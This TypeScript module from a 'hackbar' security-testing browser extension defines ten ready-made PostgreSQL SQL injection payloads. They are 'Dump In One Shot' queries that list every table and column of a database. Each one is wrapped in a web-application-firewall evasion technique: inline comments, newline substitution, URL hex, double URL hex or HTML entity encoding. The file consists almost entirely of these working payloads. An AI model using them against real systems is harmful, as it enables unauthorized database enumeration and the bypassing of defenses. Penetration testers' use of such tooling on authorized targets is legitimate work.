/**
 * XEOO HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module WafBasedDiosPostgre
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description WAF-Evasion PostgreSQL Dump In One Shot templates.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const wafDiosPostgreTemplates: BuilderTemplate[] = [
  {
    id: 'waf-dios-postgre-string-agg',
    name: 'string_agg() WAF Inline Comments (/**/)',
    tags: ['postgresql', 'waf-bypass', 'string_agg'],
    description: 'PostgreSQL WAF bypass schema dump via string_agg() and inline comments',
    content: "(SELECT/**/string_agg(table_name||chr(58)||column_name,chr(10))/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=current_schema())"
  },
  {
    id: 'waf-dios-postgre-array-to-string',
    name: 'array_to_string() WAF Chr Encoded',
    tags: ['postgresql', 'waf-bypass', 'array_agg'],
    description: 'PostgreSQL array aggregation WAF with chr(58) and chr(10) delimiters',
    content: "(SELECT/**/array_to_string(array_agg(table_name||chr(58)||column_name),chr(10))/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=current_schema())"
  },
  {
    id: 'waf-dios-postgre-pg-catalog',
    name: 'pg_catalog WAF DIOS (chr(114) for \'r\')',
    tags: ['postgresql', 'waf-bypass', 'pg_catalog'],
    description: 'Non-information schema bypass with ASCII chr(114) for relation filter',
    content: "(SELECT/**/string_agg(c.relname||chr(58)||a.attname,chr(10))/**/FROM/**/pg_class/**/c/**/JOIN/**/pg_attribute/**/a/**/ON/**/a.attrelid=c.oid/**/WHERE/**/c.relkind=chr(114)/**/AND/**/a.attnum>0)"
  },
  {
    id: 'waf-dios-postgre-query-to-xml',
    name: 'query_to_xml() WAF Comments',
    tags: ['postgresql', 'waf-bypass', 'xml'],
    description: 'XML dump function with inline comment separated query string',
    content: "(SELECT/**/query_to_xml('SELECT/**/table_name,column_name/**/FROM/**/information_schema.columns',true,false,''))"
  },
  {
    id: 'waf-dios-postgre-newline-spaces',
    name: 'No Space (%0A / Newline) PostgreSQL DIOS',
    tags: ['postgresql', 'waf-bypass', 'whitespace'],
    description: 'Newline-separated PostgreSQL DIOS bypassing whitespace filters',
    content: "(SELECT%0Astring_agg(table_name||':'||column_name,chr(10))%0AFROM%0Ainformation_schema.columns%0AWHERE%0Atable_schema=current_schema())"
  },
  {
    id: 'waf-dios-postgre-xmlagg-subquery',
    name: 'xmlagg() WAF No Comma DIOS',
    tags: ['postgresql', 'waf-bypass', 'xmlagg'],
    description: 'Extract tables & columns using xmlagg and xmlelement avoiding commas',
    content: "(SELECT/**/xmlagg(xmlelement(name/**/x,table_name||':'||column_name))/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=current_schema())"
  },
  {
    id: 'waf-dios-postgre-url-hex',
    name: 'URL Hex Encoded (%xx) PostgreSQL DIOS',
    tags: ['postgresql', 'url-hex', 'waf-bypass'],
    description: 'URL percent-hex encoded PostgreSQL DIOS bypassing string-pattern sensors',
    content: "(SELECT%20string_agg%28table_name%7C%7C%27%3A%27%7C%7Ccolumn_name%2Cchr%2810%29%29%20FROM%20information_schema.columns%20WHERE%20table_schema%3Dcurrent_schema%28%29)"
  },
  {
    id: 'waf-dios-postgre-double-url-hex',
    name: 'Double URL Hex (%25xx) PostgreSQL DIOS',
    tags: ['postgresql', 'double-hex', 'gateway-bypass'],
    description: 'Double percent-hex encoded string for multi-tier reverse proxy bypass',
    content: "%2528SELECT%2520string_agg%2528table_name%257C%257C%2527%253A%2527%257C%257Ccolumn_name%252Cchr%252810%2529%2529%2520FROM%2520information_schema.columns%2529"
  },
  {
    id: 'waf-dios-postgre-html-hex',
    name: 'HTML Entity Hex (&#x..;) PostgreSQL DIOS',
    tags: ['postgresql', 'html-hex', 'entity-decode'],
    description: 'Numeric hexadecimal HTML entity encoded keywords for decoded inputs',
    content: "(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; string_agg(table_name||chr(58)||column_name,chr(10)) &#x46;&#x52;&#x4f;&#x4d; information_schema.columns)"
  },
  {
    id: 'waf-dios-postgre-pg-catalog-class',
    name: 'WAF pg_catalog (pg_class & pg_attribute) DIOS',
    tags: ['postgresql', 'waf-bypass', 'pg_catalog', 'no-info-schema'],
    description: 'WAF comment-separated PostgreSQL catalog extraction using pg_class and pg_attribute',
    content: "(SELECT/**/string_agg(c.relname||chr(58)||a.attname,chr(10))/**/FROM/**/pg_class/**/c/**/JOIN/**/pg_attribute/**/a/**/ON/**/c.oid=a.attrelid/**/WHERE/**/a.attnum>0/**/AND/**/NOT/**/a.attisdropped/**/AND/**/c.relkind='r')"
  }
];

export const diosPostgreSubcategory: BuilderSubcategory = {
  id: 'dios-postgre',
  label: 'DIOS PostgreSQL',
  description: 'WAF bypass PostgreSQL Dump In One Shot templates (string_agg, array_to_string, URL hex, double hex, HTML entity hex)',
  templates: wafDiosPostgreTemplates
};
